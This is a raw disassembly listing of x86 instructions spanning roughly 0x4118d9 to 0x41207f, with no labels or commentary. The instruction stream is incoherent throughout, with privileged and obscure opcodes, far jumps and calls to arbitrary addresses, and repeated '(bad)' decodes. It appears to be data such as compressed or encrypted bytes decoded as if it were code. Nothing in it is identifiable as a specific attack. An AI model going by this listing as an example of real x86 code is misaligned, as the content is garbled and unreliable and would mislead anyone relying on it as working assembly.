  4118d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118db:	push   eax
  4118dc:	jmp    0x470b9d29
  4118e1:	iret   
  4118e2:	icebp  
  4118e3:	test   al,0xd0
  4118e5:	add    DWORD PTR [esi+edi*4-0x3b412483],eax
  4118ec:	test   DWORD PTR [edx+0x18c487ac],ebx
  4118f2:	add    ebp,DWORD PTR [eax*1-0x51f5ea66]
  4118f9:	int    0x10
  4118fb:	xchg   edi,eax
  4118fc:	add    dh,BYTE PTR [eax+ebp*2-0x6b]
  411900:	test   al,0x28
  411902:	mov    ch,0x2a
  411904:	rcl    esi,0xe1
  411907:	lods   al,BYTE PTR ds:[esi]
  411908:	inc    ebx
  411909:	add    DWORD PTR [esi-0x17],0xffffffda
  41190d:	les    ebp,FWORD PTR [edx+0x4c07377a]
  411913:	or     eax,0xfecc9854
  411918:	cwde   
  411919:	mov    BYTE PTR [edi+ecx*4],bh
  41191c:	inc    esi
  41191d:	mov    ebp,0x5503fec8
  411922:	into   
  411923:	jge    0x4118f9
  411925:	push   cs
  411926:	in     al,dx
  411927:	cmp    eax,0xe66c3c6c
  41192c:	cwde   
  41192d:	push   ebx
  41192e:	mov    DWORD PTR [edx-0x922aeef],ebx
  411934:	mov    ebx,0xb3303e3a
  411939:	jle    0x411951
  41193b:	mov    dh,0x85
  41193d:	adc    esp,ebx
  41193f:	or     BYTE PTR [ecx-0x205982ef],ch
  411945:	mov    al,ds:0xcf0a5da6
  41194a:	sbb    al,0xa5
  41194c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41194d:	jbe    0x411955
  41194f:	mov    BYTE PTR [ebp+0x29],cl
  411952:	dec    edi
  411953:	sbb    DWORD PTR [esi-0x2d851ac6],ebp
  411959:	test   eax,0x26e017c8
  41195e:	jae    0x4118ec
  411960:	or     DWORD PTR [ebx+ecx*4-0x7e39f12],ebp
  411967:	xchg   edi,eax
  411968:	test   BYTE PTR [ebp+0x7e],0xf
  41196c:	loope  0x411987
  41196e:	xchg   BYTE PTR [ebp-0x7f61eed7],bl
  411974:	addps  xmm3,XMMWORD PTR ds:0xb0e0d7b1
  41197b:	mov    ebx,ss
  41197d:	sub    eax,0x5f70785b
  411982:	and    esp,ebx
  411984:	dec    esp
  411985:	pop    es
  411986:	jne    0x4119e9
  411988:	mov    dl,0x13
  41198a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41198b:	dec    edi
  41198c:	inc    ebx
  41198d:	jb     0x4119ed
  41198f:	dec    edx
  411990:	push   ecx
  411991:	stos   BYTE PTR es:[edi],al
  411992:	ds mov esi,0xcc25c9da
  411998:	add    dl,BYTE PTR [edx-0x10]
  41199b:	adc    eax,0x90e3ca39
  4119a0:	jnp    0x4119ef
  4119a2:	mov    esp,0x5516b562
  4119a7:	clc    
  4119a8:	bound  esp,QWORD PTR [ebp+ebp*4-0x76]
  4119ac:	pop    ebp
  4119ad:	inc    edx
  4119ae:	push   edi
  4119af:	xchg   esp,eax
  4119b0:	push   eax
  4119b1:	push   esi
  4119b2:	lfs    eax,FWORD PTR [edx+0xa277f9e]
  4119b9:	cld    
  4119ba:	push   ecx
  4119bb:	push   ecx
  4119bc:	test   BYTE PTR [eax-0x48],0xfe
  4119c0:	je     0x41196f
  4119c2:	xchg   esi,eax
  4119c3:	pop    ss
  4119c4:	icebp  
  4119c5:	stos   BYTE PTR es:[edi],al
  4119c6:	(bad)  [eax]
  4119c8:	adc    al,0x12
  4119ca:	std    
  4119cb:	fimul  WORD PTR [esi-0x20]
  4119ce:	jle    0x4119d6
  4119d0:	and    DWORD PTR [esi+ebx*1+0x5f201844],ecx
  4119d7:	jle    0x411967
  4119d9:	adc    al,0xa9
  4119db:	jg     0x411a20
  4119dd:	fiadd  WORD PTR [ebx-0x1f]
  4119e0:	mov    ds:0x1829de58,al
  4119e5:	int3   
  4119e6:	xor    esi,DWORD PTR [ecx-0x1b]
  4119e9:	(bad)  
  4119eb:	les    edi,FWORD PTR [edx]
  4119ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119ee:	pop    ebx
  4119ef:	mov    al,ds:0x4b1148b
  4119f4:	test   eax,0xe99aad57
  4119f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119fa:	sub    DWORD PTR [edx-0xff40272],eax
  411a00:	test   eax,0x809eafdb
  411a05:	push   ss
  411a06:	and    edx,DWORD PTR [edi]
  411a08:	ror    DWORD PTR [ecx],0x80
  411a0b:	add    ch,BYTE PTR [ecx+0x4a12c079]
  411a11:	loope  0x411a0e
  411a13:	or     eax,0x970a935f
  411a18:	lock shl cl,cl
  411a1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a1c:	jno    0x4119e5
  411a1e:	fcmovu st,st(2)
  411a20:	jno    0x411a2f
  411a22:	inc    ecx
  411a23:	xchg   ebp,eax
  411a24:	jp     0x4119ee
  411a26:	jg     0x411a35
  411a28:	pop    ecx
  411a29:	in     eax,0x55
  411a2b:	popa   
  411a2c:	xchg   edx,eax
  411a2d:	ss repnz xchg esp,eax
  411a30:	mov    edx,0x59a706f1
  411a35:	repz cli 
  411a37:	push   ss
  411a38:	das    
  411a39:	inc    edx
  411a3a:	ret    
  411a3b:	popa   
  411a3c:	xchg   esi,eax
  411a3d:	jo     0x411a02
  411a3f:	test   esp,edi
  411a41:	out    dx,al
  411a42:	inc    eax
  411a43:	popf   
  411a44:	push   ecx
  411a46:	dec    ecx
  411a47:	(bad)  
  411a48:	jmp    0xf7cbb66a
  411a4d:	pop    edx
  411a4e:	outs   dx,DWORD PTR ds:[esi]
  411a4f:	daa    
  411a50:	aad    0xb
  411a52:	stos   BYTE PTR es:[edi],al
  411a53:	in     eax,0x92
  411a55:	jns    0x411a1c
  411a57:	pushf  
  411a58:	dec    ebp
  411a59:	push   ecx
  411a5a:	mov    dl,BYTE PTR [ebp-0x599b3cd8]
  411a60:	call   0x74c2c6f2
  411a65:	cdq    
  411a66:	or     eax,0xdc382f03
  411a6b:	xchg   edi,eax
  411a6c:	jmp    0x828f676e
  411a71:	xchg   edx,eax
  411a72:	cdq    
  411a73:	push   esp
  411a74:	lds    ecx,FWORD PTR [edi+0x5969248b]
  411a7a:	scas   al,BYTE PTR es:[edi]
  411a7b:	mov    al,ds:0x9ed561ac
  411a80:	inc    ecx
  411a81:	ret    0x5ac0
  411a84:	adc    al,0xb7
  411a86:	mov    ds:0x346013c5,al
  411a8b:	add    BYTE PTR [ebp+0x5fd6fed],bh
  411a91:	or     BYTE PTR [esp+ecx*4],ah
  411a94:	jge    0x411afb
  411a96:	loop   0x411a19
  411a98:	or     al,0x85
  411a9a:	mov    eax,DWORD PTR [esi+0x2a]
  411a9d:	fmul   DWORD PTR [ebp-0x71]
  411aa0:	inc    edx
  411aa1:	mov    al,ds:0x90e9c4bc
  411aa6:	xor    al,0xf7
  411aa8:	je     0x411a7e
  411aaa:	int3   
  411aab:	push   ebp
  411aac:	mov    ebx,0x61d8fc8b
  411ab1:	sahf   
  411ab2:	rcl    BYTE PTR [ebp+0x16],cl
  411ab5:	lods   al,BYTE PTR ds:[esi]
  411ab6:	sub    al,0x20
  411ab8:	mov    cl,0xe7
  411aba:	inc    ecx
  411abb:	ins    BYTE PTR es:[edi],dx
  411abc:	(bad)  
  411abd:	xchg   DWORD PTR [edx+0x62a8205],ebx
  411ac3:	push   esi
  411ac4:	dec    esp
  411ac5:	mov    cl,0x65
  411ac7:	nop
  411ac8:	mov    WORD PTR [ebp+0x6f9ac449],?
  411ace:	mov    ds:0xc7002150,eax
  411ad3:	fisub  WORD PTR [eax]
  411ad5:	mov    BYTE PTR [ecx+ebx*2],al
  411ad8:	adc    DWORD PTR [edx+0x39],esi
  411adb:	or     DWORD PTR [ebp+ecx*2+0x39],ebp
  411adf:	push   ds
  411ae0:	fcomp  st(2)
  411ae2:	jno    0x411ad9
  411ae4:	cmc    
  411ae5:	xchg   esp,ecx
  411ae7:	gs xchg ecx,eax
  411ae9:	mov    ah,0xea
  411aeb:	loop   0x411b26
  411aed:	mov    cl,0x3c
  411aef:	ins    BYTE PTR es:[edi],dx
  411af0:	fstp   TBYTE PTR [ebx]
  411af2:	into   
  411af3:	mov    eax,0x6a17a318
  411af8:	add    al,0x20
  411afa:	leave  
  411afb:	dec    eax
  411afc:	sti    
  411afd:	inc    ebx
  411afe:	push   esi
  411aff:	inc    esp
  411b00:	mov    eax,ds:0x8932c54f
  411b05:	out    0x34,al
  411b07:	jae    0x411b71
  411b09:	add    ebx,edx
  411b0b:	pop    edx
  411b0c:	mov    eax,ds:0x3b160783
  411b11:	cli    
  411b12:	dec    edx
  411b13:	cmp    BYTE PTR [ebx],dl
  411b15:	mov    eax,ds:0x7dec0c17
  411b1a:	dec    esp
  411b1b:	sar    edx,cl
  411b1d:	xor    BYTE PTR [esi+0x9],cl
  411b20:	add    dh,BYTE PTR [edx+0x6afcbe69]
  411b26:	pop    esi
  411b27:	scas   eax,DWORD PTR es:[edi]
  411b28:	fcom   DWORD PTR [ebx-0x49]
  411b2b:	mov    dh,ch
  411b2d:	mov    WORD PTR [esi+ebx*4+0x6d],ds
  411b31:	xchg   DWORD PTR [edx-0x7d62380f],ebx
  411b37:	push   0x6c08014
  411b3c:	xor    dh,BYTE PTR [ebx]
  411b3e:	scas   eax,DWORD PTR es:[edi]
  411b3f:	enter  0x7ab1,0x6b
  411b43:	xchg   DWORD PTR [edx+eiz*1],esp
  411b46:	mov    cl,0x42
  411b48:	push   ds
  411b49:	je     0x411b43
  411b4b:	or     BYTE PTR [eax+ebx*8-0x6d],0x87
  411b50:	inc    ebx
  411b51:	or     edi,DWORD PTR [edi+0x6f]
  411b54:	pop    edi
  411b55:	and    BYTE PTR [ebp+0x1e],dh
  411b58:	push   ebp
  411b59:	or     bl,BYTE PTR ds:0x8e9c7bb4
  411b5f:	jmp    FWORD PTR [ecx]
  411b61:	fdivr  QWORD PTR [eax]
  411b63:	test   BYTE PTR [ebx],dh
  411b65:	mov    ebp,0x7d278c35
  411b6a:	xor    BYTE PTR [esi],dh
  411b6c:	xor    eax,0x77d5c351
  411b71:	push   edi
  411b72:	out    0x53,al
  411b74:	xchg   ebp,eax
  411b75:	inc    DWORD PTR [esi]
  411b77:	mov    ds:0xf7f0dbd9,al
  411b7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b7d:	xchg   ecx,eax
  411b7e:	jl     0x411bc8
  411b80:	cmp    bh,bh
  411b82:	repnz in eax,0xfd
  411b85:	xor    DWORD PTR [edi+0x5f070e0b],ebx
  411b8b:	jp     0x411c05
  411b8d:	sbb    eax,0xb2454e7b
  411b92:	or     DWORD PTR [ebp+0x22],edx
  411b95:	or     edx,DWORD PTR [ebx+edx*1]
  411b98:	test   eax,0x6da7087f
  411b9d:	push   cs
  411b9e:	aam    0xbb
  411ba0:	xor    ebp,ecx
  411ba2:	adc    ebx,DWORD PTR [edx+0x1c]
  411ba5:	test   al,0x73
  411ba7:	arpl   WORD PTR [eax+0x40dbd64d],ax
  411bad:	xor    eax,0x17f4772b
  411bb2:	pop    ecx
  411bb3:	mov    esi,0xadcdb7b0
  411bb8:	outs   dx,BYTE PTR ds:[esi]
  411bb9:	adc    DWORD PTR [esp+ebp*1],0x5f
  411bbd:	daa    
  411bbe:	sbb    BYTE PTR [bp+di+0x3f],ah
  411bc2:	or     eax,ebx
  411bc4:	mov    al,0x89
  411bc6:	inc    ecx
  411bc7:	mov    al,0x86
  411bc9:	cwde   
  411bca:	jnp    0x411c22
  411bcc:	mov    dl,BYTE PTR [ecx-0x2d]
  411bcf:	mov    ds:0x44bb221b,al
  411bd4:	ja     0x411b5c
  411bd6:	sub    eax,0x2c31cfee
  411bdb:	retf   
  411bdc:	mov    ss:0x7eea3021,eax
  411be2:	and    DWORD PTR [ebx-0x3435cf29],0x3b
  411be9:	mov    ebx,0x9aa6e7c4
  411bee:	jno    0x411baa
  411bf0:	arpl   dx,bx
  411bf2:	xor    esi,DWORD PTR [ebx-0x509a308b]
  411bf8:	lds    ebx,FWORD PTR [edi]
  411bfa:	sub    al,0x3f
  411bfc:	jl     0x411be3
  411bfe:	dec    esi
  411bff:	stos   DWORD PTR es:[edi],eax
  411c00:	mov    BYTE PTR [edi+0x45],cl
  411c03:	adc    DWORD PTR [ecx+0x19643320],0xa1269e21
  411c0d:	loope  0x411bed
  411c0f:	adc    BYTE PTR [edi-0x66],0xfa
  411c13:	push   eax
  411c14:	popa   
  411c15:	jmp    0xcc0c4718
  411c1a:	fstp   TBYTE PTR [edi+0x5fc5bc96]
  411c20:	and    dl,ah
  411c22:	out    0x5b,eax
  411c24:	and    cl,dl
  411c26:	sbb    ecx,DWORD PTR cs:[esi+0x50]
  411c2a:	push   eax
  411c2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c2c:	rcl    ebx,0xef
  411c2f:	mov    ds,WORD PTR [edi-0x45b00fd4]
  411c35:	sub    DWORD PTR [edi+0x6f],eax
  411c38:	jnp    0x411c00
  411c3a:	imul   edi,ebp,0x57
  411c3d:	ds mov ebx,0x55eef7bc
  411c43:	repnz in al,0xe1
  411c46:	test   DWORD PTR [ecx-0x6b],esp
  411c49:	cmp    ebx,ebp
  411c4b:	jns    0x411c11
  411c4d:	fs mov ch,0x66
  411c50:	retf   0x7ff4
  411c53:	sbb    al,0xf8
  411c55:	jecxz  0x411c68
  411c57:	and    esp,DWORD PTR [ebx+ebx*4+0x62]
  411c5b:	adc    eax,0x8c057a3b
  411c60:	and    esp,DWORD PTR [esi]
  411c62:	push   ecx
  411c63:	add    al,BYTE PTR ss:[eax-0x71]
  411c67:	sub    ecx,esi
  411c69:	xor    al,0x37
  411c6b:	rcl    DWORD PTR [eax+0x15],cl
  411c6e:	cld    
  411c6f:	fild   QWORD PTR [eax+0x8]
  411c72:	call   0x4ae7cab5
  411c77:	add    al,ah
  411c79:	sbb    DWORD PTR [ebx-0x31ea08c8],esp
  411c7f:	(bad)  
  411c80:	mov    ebp,0x1ac46e27
  411c85:	pop    edx
  411c86:	adc    dh,bl
  411c88:	test   eax,0xa7ef4470
  411c8d:	jmp    0x8bf95d0
  411c92:	fwait
  411c93:	out    dx,al
  411c94:	xor    BYTE PTR [edx+0x7b21fe0e],cl
  411c9a:	or     bh,ch
  411c9c:	test   eax,0x7ae9b2b6
  411ca1:	jmp    0x411d0f
  411ca3:	icebp  
  411ca4:	add    cl,BYTE PTR [edi]
  411ca6:	test   edx,eax
  411ca8:	stos   DWORD PTR es:[edi],eax
  411ca9:	int    0x9
  411cab:	ss cmp eax,0x8cb3d26c
  411cb1:	repz icebp 
  411cb3:	sub    DWORD PTR ds:0x91caf758,esi
  411cb9:	cdq    
  411cba:	shl    DWORD PTR [ebp+ebp*2-0x7a],cl
  411cbe:	mov    esp,0xc2dd0e28
  411cc3:	jns    0x411d20
  411cc5:	pusha  
  411cc6:	mov    esp,DWORD PTR [eax+0x2e71c77f]
  411ccc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ccd:	jp     0x411d00
  411ccf:	push   esi
  411cd0:	inc    eax
  411cd1:	test   al,0xe3
  411cd3:	loopne 0x411d0d
  411cd5:	jmp    0x7caf:0x297fd941
  411cdc:	jge    0x411c9f
  411cde:	mov    eax,0x26d2b09a
  411ce3:	xor    BYTE PTR [ebp-0x7a],0xfa
  411ce7:	dec    esp
  411ce8:	shl    DWORD PTR [edx+eax*8+0x333cdaa4],1
  411cef:	sbb    DWORD PTR [eax-0x42],eax
  411cf2:	lock aas 
  411cf4:	clc    
  411cf5:	mov    cl,0xa
  411cf7:	int    0xbe
  411cf9:	aad    0xd3
  411cfb:	and    eax,0x27cc0ee2
  411d00:	dec    edi
  411d01:	outs   dx,DWORD PTR ds:[esi]
  411d02:	es push esi
  411d04:	sbb    BYTE PTR [ebp-0x3ddd23ee],ch
  411d0a:	rcl    bl,0x4d
  411d0d:	das    
  411d0e:	inc    edx
  411d0f:	adc    ebp,DWORD PTR [esi]
  411d11:	rcr    ebp,0x37
  411d14:	retf   0x48e8
  411d17:	dec    eax
  411d18:	adc    edx,DWORD PTR [eax-0x5c3a8170]
  411d1e:	lods   al,BYTE PTR ds:[esi]
  411d1f:	xor    DWORD PTR [ecx],ebx
  411d21:	jmp    0x6e38:0xd578ac05
  411d28:	stc    
  411d29:	stos   DWORD PTR es:[edi],eax
  411d2a:	lods   eax,DWORD PTR ds:[esi]
  411d2b:	outs   dx,BYTE PTR ds:[esi]
  411d2c:	sahf   
  411d2d:	xchg   DWORD PTR [ecx-0xe9c5f0e],edi
  411d33:	int3   
  411d34:	cmp    al,0x71
  411d36:	rcr    DWORD PTR [ebx],1
  411d38:	dec    ecx
  411d39:	ja     0x411cf0
  411d3b:	les    ebx,FWORD PTR [edx+0x40]
  411d3e:	pop    esi
  411d3f:	cli    
  411d40:	sti    
  411d41:	and    BYTE PTR [edx+0x78],bl
  411d44:	mov    ebp,0xbfa733cb
  411d49:	push   ss
  411d4a:	mov    ds:0x2e016164,al
  411d4f:	or     ch,BYTE PTR [ebp+0x2b]
  411d52:	ins    BYTE PTR es:[di],dx
  411d54:	enter  0x8fde,0xd2
  411d58:	xchg   edx,eax
  411d59:	aam    0xf4
  411d5b:	fadd   st(0),st
  411d5d:	scas   eax,DWORD PTR es:[edi]
  411d5e:	sbb    bl,ch
  411d60:	dec    esi
  411d61:	shr    edx,0x40
  411d64:	sub    al,0x5e
  411d66:	adc    ebp,DWORD PTR [ebx-0x7cbe73e3]
  411d6c:	sub    dh,BYTE PTR [ebp+0x5550c167]
  411d72:	xchg   esi,eax
  411d73:	mov    eax,DWORD PTR [eax-0x3f]
  411d76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d77:	mov    ch,0xb0
  411d79:	out    dx,al
  411d7a:	and    eax,0x5b3421bc
  411d7f:	mov    ds:0xc2be154a,al
  411d84:	xchg   esi,eax
  411d85:	sbb    al,0x32
  411d87:	int3   
  411d88:	es fdivr st,st(1)
  411d8b:	mov    ah,0x73
  411d8d:	dec    edi
  411d8e:	xchg   ebp,eax
  411d8f:	stc    
  411d90:	mov    gs,WORD PTR [edx+0x27]
  411d93:	push   cs
  411d94:	xor    dh,BYTE PTR [ebp+0x30]
  411d97:	cmp    eax,0xf12d84fd
  411d9c:	mov    WORD PTR [ecx+0x4f91365f],fs
  411da2:	mov    esi,0x508513d6
  411da7:	sbb    eax,0x8a2fee51
  411dac:	cli    
  411dad:	jge    0x411de3
  411daf:	adc    dh,ch
  411db1:	xchg   edx,eax
  411db2:	aas    
  411db3:	daa    
  411db4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411db5:	jge    0x411da4
  411db7:	sub    ah,bl
  411db9:	lock in eax,dx
  411dbb:	xchg   ecx,edx
  411dbd:	pop    ds
  411dbe:	call   0x54615743
  411dc3:	fst    st(0)
  411dc5:	push   edx
  411dc6:	jns    0x411e22
  411dc8:	cmp    al,0xb1
  411dca:	inc    ebp
  411dcb:	in     eax,0x16
  411dcd:	dec    esi
  411dce:	jno    0x411da5
  411dd0:	rcr    BYTE PTR [ebx+0x71],0xa6
  411dd4:	stos   DWORD PTR es:[edi],eax
  411dd5:	jnp    0x411d75
  411dd7:	imul   eax,DWORD PTR [eax+0x55cb8743],0x79
  411dde:	push   ds
  411ddf:	pop    esp
  411de0:	sbb    BYTE PTR [esi],bl
  411de2:	repz add al,0x0
  411de5:	jns    0x411e0d
  411de7:	push   eax
  411de8:	stc    
  411de9:	add    BYTE PTR [ecx],bh
  411deb:	sub    esp,esp
  411ded:	mov    cl,0x8c
  411def:	iret   
  411df0:	sub    BYTE PTR [edx+0x778bfb69],cl
  411df6:	retf   
  411df7:	not    DWORD PTR [eax]
  411df9:	sbb    cl,BYTE PTR [esi+ebp*1-0x24f2ccb9]
  411e00:	sbb    BYTE PTR [ebx-0x50],ch
  411e03:	inc    ebx
  411e04:	xor    BYTE PTR ds:0xe168d739,al
  411e0a:	add    al,0x88
  411e0c:	cmp    cl,BYTE PTR [edx+0x10]
  411e0f:	pop    edx
  411e10:	dec    edx
  411e11:	xchg   edx,eax
  411e12:	jmp    0x5577:0x63fe5d8b
  411e19:	popf   
  411e1a:	fdiv   QWORD PTR [ebx+0x36caf664]
  411e20:	fiadd  DWORD PTR [ebx-0x36]
  411e23:	icebp  
  411e24:	or     BYTE PTR [ebx+0x6e],ah
  411e27:	aad    0x7a
  411e29:	and    edi,DWORD PTR [eax-0x27]
  411e2c:	push   ss
  411e2d:	dec    esi
  411e2e:	and    BYTE PTR [edi+0xb],bl
  411e31:	bound  ebx,QWORD PTR [esi+ebp*2-0x55]
  411e35:	mov    bh,0xcf
  411e37:	into   
  411e38:	sbb    ch,BYTE PTR [edx-0x23d86b05]
  411e3e:	ins    DWORD PTR es:[edi],dx
  411e3f:	and    cl,dl
  411e41:	add    eax,0xec7f2280
  411e46:	shr    BYTE PTR es:[edi-0x12],0xde
  411e4b:	pop    ds
  411e4c:	sahf   
  411e4d:	xlat   BYTE PTR ds:[ebx]
  411e4e:	mov    al,0x16
  411e50:	and    al,0xb2
  411e52:	jp     0x411e13
  411e54:	xor    al,0x8d
  411e56:	adc    BYTE PTR [eax],bh
  411e58:	fidiv  WORD PTR [ebp-0x478a232d]
  411e5e:	test   eax,0x75df8104
  411e63:	leave  
  411e64:	fsub   QWORD PTR [edi]
  411e66:	sub    al,BYTE PTR cs:[esi+0x504057ed]
  411e6d:	fwait
  411e6e:	lods   al,BYTE PTR ds:[esi]
  411e6f:	xor    eax,0x852cafb9
  411e74:	sub    ebx,edi
  411e76:	ret    0x409a
  411e79:	push   esp
  411e7a:	xchg   ebx,edx
  411e7c:	push   edi
  411e7d:	dec    ecx
  411e7e:	sbb    eax,DWORD PTR [ebx-0x7f]
  411e81:	xor    al,0x64
  411e83:	iret   
  411e84:	mov    ebp,0x4c3ccd3f
  411e89:	mov    al,0x2a
  411e8b:	inc    ebx
  411e8c:	punpckldq mm1,mm0
  411e8f:	int    0xb6
  411e91:	pop    eax
  411e92:	into   
  411e93:	test   eax,0x628b9f92
  411e98:	int3   
  411e99:	nop
  411e9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e9b:	fstp   QWORD PTR ds:0xf24fa5a0
  411ea1:	fiadd  DWORD PTR [edx-0x7c]
  411ea4:	loope  0x411ecf
  411ea6:	ret    
  411ea7:	xchg   ecx,eax
  411ea8:	jmp    0xe8fbc957
  411ead:	jmp    0x411ebc
  411eaf:	stos   DWORD PTR es:[edi],eax
  411eb0:	mov    ah,0x72
  411eb2:	aaa    
  411eb3:	mov    ch,0xf5
  411eb5:	pop    ebp
  411eb6:	xchg   edx,eax
  411eb7:	js     0x411e8e
  411eb9:	and    al,0xe3
  411ebb:	mov    ebp,es
  411ebd:	pop    edx
  411ebe:	popf   
  411ebf:	sub    dh,BYTE PTR [edx-0x35413682]
  411ec5:	sbb    eax,0xf3c7639f
  411eca:	inc    esi
  411ecb:	and    esp,DWORD PTR [eax+0x17]
  411ece:	fiadd  DWORD PTR [edx+0x6a290c5f]
  411ed4:	(bad)  
  411ed5:	pop    edi
  411ed6:	or     bl,bh
  411ed8:	mov    eax,0x4ab61c07
  411edd:	inc    DWORD PTR [edi-0x77]
  411ee0:	sub    eax,0xf7647355
  411ee5:	push   eax
  411ee6:	push   0x4a
  411ee8:	imul   esi,DWORD PTR [edx-0x523761bd],0x7b
  411eef:	or     DWORD PTR [edx+0x3f],0xfdd7332f
  411ef6:	push   edi
  411ef7:	ins    DWORD PTR es:[edi],dx
  411ef8:	inc    ebx
  411ef9:	mov    edx,esi
  411efb:	imul   esp,ebx,0xfc9f032c
  411f01:	iret   
  411f02:	xchg   edi,eax
  411f03:	lock mov ebp,0xd02f70b3
  411f09:	jmp    0x411ee9
  411f0b:	pop    esi
  411f0c:	retf   
  411f0d:	imul   esp,ebx,0x61898d58
  411f13:	mov    al,0x79
  411f15:	hlt    
  411f16:	mov    al,ds:0x914509ad
  411f1b:	ret    0xe87d
  411f1e:	dec    edx
  411f1f:	mov    al,0x50
  411f21:	add    al,0x31
  411f23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f24:	(bad)  
  411f25:	jmp    0x9e17ee77
  411f2a:	(bad)  
  411f2b:	sub    eax,DWORD PTR [edx+0x63]
  411f2e:	sub    ebp,DWORD PTR [ebx-0x52]
  411f31:	fnsave [ebx+0x74]
  411f34:	add    BYTE PTR [eax],dl
  411f36:	fistp  DWORD PTR [esi-0x49c58a5c]
  411f3c:	sahf   
  411f3d:	sub    ch,dl
  411f3f:	ds pusha 
  411f41:	cmp    BYTE PTR [edi+eax*1],dh
  411f44:	cdq    
  411f45:	jmp    0x536c00ce
  411f4a:	scas   eax,DWORD PTR es:[edi]
  411f4b:	mov    DWORD PTR [ecx],ebx
  411f4d:	test   eax,0xdf47ac80
  411f52:	or     al,0x7d
  411f54:	clc    
  411f55:	sub    eax,0xdf72f
  411f5a:	pusha  
  411f5b:	cs stos BYTE PTR es:[edi],al
  411f5d:	ins    BYTE PTR es:[edi],dx
  411f5e:	out    0x80,eax
  411f60:	jmp    0xb54e4d8f
  411f65:	sbb    ebx,eax
  411f67:	jno    0x411f56
  411f69:	push   esp
  411f6a:	sbb    ebp,DWORD PTR [ecx-0x4a]
  411f6d:	dec    eax
  411f6e:	or     bl,BYTE PTR [esi+0x11767c1d]
  411f74:	xlat   BYTE PTR ds:[ebx]
  411f75:	and    BYTE PTR [esi+0x25ff11],ch
  411f7b:	and    BYTE PTR [esi+0x501eb486],al
  411f81:	fstp   DWORD PTR [ebp+0x20327805]
  411f87:	cdq    
  411f88:	dec    edi
  411f89:	adc    BYTE PTR [eax-0x65b7f24],dh
  411f8f:	out    0x4c,al
  411f91:	outs   dx,DWORD PTR ds:[esi]
  411f92:	push   0x737673bd
  411f97:	mov    ebx,0x2bb47313
  411f9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f9d:	lahf   
  411f9e:	mov    esp,DWORD PTR [ecx]
  411fa0:	fsubp  st(0),st
  411fa2:	cmp    al,0x69
  411fa4:	pop    ds
  411fa5:	mov    edi,0x5e59bcc8
  411faa:	aaa    
  411fab:	mov    bl,0xea
  411fad:	adc    ebp,DWORD PTR [edx-0x63882a38]
  411fb3:	daa    
  411fb4:	cli    
  411fb5:	xor    bh,BYTE PTR [edi-0x25]
  411fb8:	xchg   ebp,eax
  411fb9:	xor    eax,DWORD PTR [edi+0x11]
  411fbc:	scas   al,BYTE PTR es:[edi]
  411fbd:	fistp  QWORD PTR [eax+0x62]
  411fc0:	inc    esp
  411fc1:	pop    ds
  411fc2:	push   0xa5ab636d
  411fc7:	add    eax,0x4892ee72
  411fcc:	lock out 0x11,eax
  411fcf:	jmp    0x412027
  411fd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fd2:	dec    ebp
  411fd3:	and    BYTE PTR [ebx-0x3f5a7ec1],bh
  411fd9:	push   0xa161c80c
  411fde:	loope  0x41205c
  411fe0:	and    al,0xba
  411fe2:	ins    DWORD PTR es:[edi],dx
  411fe3:	fidiv  WORD PTR [ebx]
  411fe5:	cmp    DWORD PTR [ecx],ebx
  411fe7:	in     eax,0xb
  411fe9:	push   cs
  411fea:	test   BYTE PTR [edi+eiz*2+0x44491ac9],dl
  411ff1:	fabs   
  411ff3:	dec    ebx
  411ff4:	jl     0x41202c
  411ff6:	icebp  
  411ff7:	add    edi,edi
  411ff9:	push   0xffffffca
  411ffb:	repz dec eax
  411ffd:	imul   edx,DWORD PTR [edi+0x7f],0x18
  412001:	adc    BYTE PTR [ebp+0xe],ah
  412004:	cmp    ch,BYTE PTR [eax]
  412006:	(bad)  
  412007:	sbb    esi,esi
  412009:	jmp    0x6c01:0x68fb683f
  412010:	xlat   BYTE PTR ds:[ebx]
  412011:	jecxz  0x411fe1
  412013:	adc    eax,esi
  412015:	fwait
  412016:	push   ds
  412017:	inc    esp
  412018:	(bad)  
  412019:	fmul   DWORD PTR [ecx+edi*2+0x6184f13c]
  412020:	cmp    dh,0x1c
  412023:	xor    al,0xd6
  412025:	mov    cl,0x9c
  412027:	sub    eax,DWORD PTR [ecx]
  412029:	shr    ebp,cl
  41202b:	mov    ebp,0xa6620d3f
  412030:	dec    ebx
  412031:	pop    edx
  412032:	mov    al,0xa9
  412034:	adc    bl,BYTE PTR [edi-0x64]
  412037:	div    DWORD PTR [eax+0x5b]
  41203a:	imul   BYTE PTR [edi]
  41203c:	or     al,0xa8
  41203e:	pop    esi
  41203f:	nop
  412040:	cmp    al,0x55
  412042:	scas   eax,DWORD PTR es:[edi]
  412043:	scas   eax,DWORD PTR es:[edi]
  412044:	pop    esi
  412045:	lahf   
  412046:	cmp    DWORD PTR [ecx-0x52],edi
  412049:	or     al,0xd2
  41204b:	(bad)  
  41204c:	jge    0x41202f
  41204e:	push   esp
  41204f:	aaa    
  412050:	pushf  
  412051:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412052:	or     bl,BYTE PTR [eax]
  412054:	pop    ss
  412055:	pop    esi
  412056:	hlt    
  412057:	repz (bad) 
  412059:	loopne 0x412093
  41205b:	mov    esi,0x19e3d9ea
  412060:	push   esi
  412061:	daa    
  412062:	clc    
  412063:	mov    edi,0xa46ad183
  412068:	fstp   st(5)
  41206a:	gs pop esp
  41206c:	sbb    bh,dh
  41206e:	cmp    BYTE PTR [ecx+0x6d28fc1d],ch
  412074:	out    0x92,eax
  412076:	cmp    edx,0xa
  412079:	arpl   WORD PTR [edi],sp
  41207b:	lock nop
  41207d:	dec    BYTE PTR [ecx]
  41207f:	pop    ss
